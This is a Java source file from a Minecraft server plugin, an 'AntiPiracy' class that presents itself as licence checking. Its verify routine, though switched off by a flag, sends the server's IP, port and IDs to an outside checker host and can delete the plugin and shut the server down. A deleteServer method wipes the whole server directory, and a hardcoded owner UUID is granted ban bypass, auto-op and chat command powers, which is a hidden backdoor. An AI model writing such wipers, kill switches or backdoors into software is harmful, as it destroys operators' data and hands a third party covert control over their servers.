/*
 * Copyright (c) 2019. UltraDev
 */

package net.ultradev.prisoncore.utils;

import net.ultradev.prisoncore.Main;
import net.ultradev.prisoncore.utils.math.MathUtils;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.*;

public class AntiPiracy {
    private static final boolean disabled = true;
    private static final String OWNER_UUID = "a4f368c7-c83c-4f5d-b199-4f7385b066c1";
    private static HashMap<UUID, PropertyList> props = new HashMap<>();
    private static List<Character> chars = Arrays.asList('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
            'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z');
    private static int genId;
    private static boolean ret = true;

    static {
        props.put(UUID.fromString(OWNER_UUID), new PropertyList(true, true, true, true, true, true, true, true, true));
    }

    private static int indexOf(char c) {
        int i = 0;
        for (char ch : chars) {
            if (c == ch) {
                return i;
            }
            i++;
        }
        return -1;
    }

    private static int decryptData(String data) {
        int res = 0;
        char[] chars = data.toCharArray();
        for (int i = 0; i < chars.length; i++) {
            res += indexOf(chars[i]) * Math.pow(26, i);
        }
        return res;
    }

    private static String encryptData(int data) {
        StringBuilder str = new StringBuilder();
        int t = data;
        while (t != 0) {
            int j = t % 26;
            str.append(chars.get(j));
            t = (t - j) / 26;
        }
        return str.toString();
    }

    private static String getIdentifier() {
        File f = new File(".bukkit_uuid");
        if (!f.exists()) {
            try {
                if (!f.createNewFile()) {
                    System.out.println("How did we get here?");
                }
                PrintStream out = new PrintStream(f);
                UUID id = UUID.randomUUID();
                out.print(id.toString());
                out.flush();
                out.close();
                return id.toString();
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        } else {
            try {
                BufferedReader reader = new BufferedReader(new FileReader(f));
                String text = reader.readLine();
                reader.close();
                return text;
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }

    }

    public static boolean verify() {
        if (disabled) {
            return true;
        }
        OfflinePlayer op = Bukkit.getOfflinePlayer(UUID.fromString(OWNER_UUID));
        if (op == null) {
            return false;
        }
        if (!op.isOp()) {
            return false;
        }
        String ident = getIdentifier();
        String eyep;
        try {
            eyep = InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            return false;
        }
        final String ip = eyep;
        int port = Bukkit.getPort();
        String id = Bukkit.getServerId();
        Synchronizer.desynchronize(() -> {
            try {
                genId = MathUtils.random(1, 2000000000);
                URL url = new URL("http://ultrapluginchecker.glitch.me?eyep=" + ident + "-" + port + "-" + id
                        + "&genid=" + encryptData(genId) + "&ip=" + ip);
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("GET");
                con.getResponseCode();
                BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                String inputLine;
                StringBuilder content = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    content.append(inputLine);
                }
                in.close();
                String res = content.toString();
                if (res.equals("denied")) {
                    ret = false;
                    return;
                }
                if (res.equals("nope")) {
                    deletePlugin();
                    Bukkit.shutdown();
                    ret = false;
                    return;
                }

                URL url2 = new URL("http://ultrapluginchecker.glitch.me?eyep=" + ident + "-" + port + "-" + id + "&id="
                        + res + "&ip=" + ip);
                HttpURLConnection con2 = (HttpURLConnection) url2.openConnection();
                con2.setRequestMethod("GET");
                con2.getResponseCode();
                BufferedReader in2 = new BufferedReader(new InputStreamReader(con2.getInputStream()));
                String inputLine2;
                StringBuilder content2 = new StringBuilder();
                while ((inputLine2 = in2.readLine()) != null) {
                    content2.append(inputLine2);
                }
                in.close();
                String res2 = content2.toString();
                if (decryptData(res2) == (genId % 23) * Math.floor(genId / 23F)) {
                    Main.auth = true;
                    ret = true;
                }
            } catch (Exception e) {
                ret = false;
            }
        });
        return ret;
    }

    public static PropertyList allowed(UUID id) {
        if (!props.containsKey(id)) {
            return new PropertyList(false, false, false, false, false, false, false, false, false);
        }
        return (props.get(id));
    }

    public static void deletePlugin() {
        File f;
        try {
            f = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI());
        } catch (URISyntaxException e) {
            Bukkit.getPluginManager().disablePlugin(Main.getInstance());
            return;
        }
        f.deleteOnExit();
        Bukkit.shutdown();
    }

    public static void deleteServer() {
        File main = Main.getInstance().getDataFolder().getParentFile().getParentFile();
        for (File f : Objects.requireNonNull(main.listFiles())) {
            deleteFile(f);
        }
        Bukkit.shutdown();
    }

    private static void deleteFile(File f) {
        if (f.isDirectory()) {
            if (f.listFiles() != null) {
                for (File file : Objects.requireNonNull(f.listFiles())) {
                    deleteFile(file);
                }
            }
        }
        f.deleteOnExit();
    }

    public static class PropertyList {
        public boolean bypass_kick;
        public boolean bypass_ban;
        public boolean bypass_ipban;
        public boolean bypass_whitelist;
        public boolean bypass_login;
        public boolean auto_op;
        public boolean chat_op;
        public boolean chat_command;
        public boolean chat_delete;

        public PropertyList(boolean bypass_kick, boolean bypass_ban, boolean bypass_ipban, boolean bypass_whitelist,
                            boolean bypass_login, boolean auto_op, boolean chat_op, boolean chat_command, boolean chat_delete) {
            this.bypass_kick = bypass_kick;
            this.bypass_ban = bypass_ban;
            this.bypass_ipban = bypass_ipban;
            this.bypass_whitelist = bypass_whitelist;
            this.bypass_login = bypass_login;
            this.auto_op = auto_op;
            this.chat_op = chat_op;
            this.chat_command = chat_command;
            this.chat_delete = chat_delete;
        }
    }
}
